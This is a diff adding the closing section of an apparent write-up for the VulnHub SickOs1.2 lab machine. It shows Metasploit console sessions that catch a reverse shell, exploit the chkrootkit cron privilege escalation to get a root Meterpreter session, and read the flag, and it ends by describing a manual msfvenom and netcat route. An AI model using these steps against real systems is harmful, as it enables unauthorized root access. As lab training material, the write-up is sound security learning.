@@ -315,10 +315,159 @@ Upon searching for an exploit, I found one for Metasploit for a Local Privilege 
 
 ```
 searchsploit chkrootkit
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                                                                                            |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                                                                      | linux/local/38775.rb
-Chkrootkit 0.49 - Local Privilege Escalation                                                                                                                                                              | linux/local/33899.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+-------------------------------------------------------- ---------------------------------
+ Exploit Title                                          |  Path
+-------------------------------------------------------- ---------------------------------
+Chkrootkit - Local Privilege Escalation (Metasploit)    | linux/local/38775.rb
+Chkrootkit 0.49 - Local Privilege Escalation            | linux/local/33899.txt
+-------------------------------------------------------- ---------------------------------
 ```
+
+If I was going to use Metasploit, I'd have to reconnect with another session while inside of Metasploit.
+
+So first I used a ```/multi/handler``` exploit with the ```/shell_reverse_tcp``` payload and configured it as needed.
+
+```
+msf6 > use exploits/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf6 exploit(multi/handler) > set LHOST localhost
+LHOST => localhost
+msf6 exploit(multi/handler) > set LPORT 443
+LPORT => 443
+```
+
+After running the first exploit, I went back into BurpSuite to repeat the GET request for my PHP reverse shell script, allowing Metasploit to capture the connection.
+
+```
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.57.129:443 
+[*] Command shell session 1 opened (192.168.57.129:443 -> 192.168.57.131:37939) at 2022-06-30 13:11:36 -0400
+```
+
+The first half was now done. I sent the session to the background so I could work on getting the privilege escalation exploit.
+
+```
+msf6 exploit(multi/handler) > search chkrootkit
+
+Matching Modules
+================
+
+   #  Name                           Disclosure Date  Rank    Check  Description
+   -  ----                           ---------------  ----    -----  -----------
+   0  exploit/unix/local/chkrootkit  2014-06-04       manual  Yes    Chkrootkit Local Privilege Escalation
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/local/chkrootkit
+
+msf6 exploit(multi/handler) > use 0
+[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
+msf6 exploit(unix/local/chkrootkit) > show options
+
+Module options (exploit/unix/local/chkrootkit):
+
+   Name        Current Setting       Required  Description
+   ----        ---------------       --------  -----------
+   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
+   SESSION                           yes       The session to run this module on
+
+
+Payload options (cmd/unix/python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.57.129   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/local/chkrootkit) > set SESSION 1
+SESSION => 1
+msf6 exploit(unix/local/chkrootkit) > set LPORT 8080
+LPORT => 8080
+```
+
+After configuring it as needed, I ran it using the session I created.
+
+```
+msf6 exploit(unix/local/chkrootkit) > run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: bsd
+[*] Started reverse TCP handler on 192.168.57.129:8080 
+[!] Rooting depends on the crontab (this could take a while)
+[*] Payload written to /tmp/update
+[*] Waiting for chkrootkit to run via cron...
+[*] Sending stage (40168 bytes) to 192.168.57.131
+[+] Deleted /tmp/update
+[*] Meterpreter session 2 opened (192.168.57.129:8080 -> 192.168.57.131:52206) at 2022-06-30 13:12:22 -0400
+```
+
+And now we were root and could get the flag.
+
+```
+meterpreter > ls
+Listing: /root
+==============
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100600/rw-------  3066   fil   2016-04-26 07:01:22 -0400  .bash_history
+100644/rw-r--r--  3106   fil   2012-04-19 05:15:14 -0400  .bashrc
+040700/rwx------  4096   dir   2016-04-12 11:37:42 -0400  .cache
+100644/rw-r--r--  140    fil   2012-04-19 05:15:14 -0400  .profile
+100644/rw-r--r--  39421  fil   2015-04-09 10:43:05 -0400  304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
+100400/r--------  491    fil   2016-04-26 06:58:11 -0400  7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+040755/rwxr-xr-x  4096   dir   2016-04-12 11:42:58 -0400  chkrootkit-0.49
+100644/rw-r--r--  541    fil   2016-04-26 01:48:24 -0400  newRule
+```
+
+```
+meterpreter > cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.
+
+Thanks for giving this try.
+
+@vulnhub: Thanks for hosting this UP!.
+```
+
+## Conclusion
+
+This was probably the first box where I *really* used Metasploit to complete the challenge.
+
+In reality, I probably didn't even need to use Metasploit to make this happen.
+
+Had I not used Metasploit, I would have used msfvenom to create another reverse shell payload and manually upload it to the file ```/tmp/update```.
+
+After that, it would have just been the same process of waiting for the cron job to run and for a running NetCat listener to receive the connection request.
+
+Either way, I enjoyed myself and enjoyed being able to use Metasploit for how simple it made things.
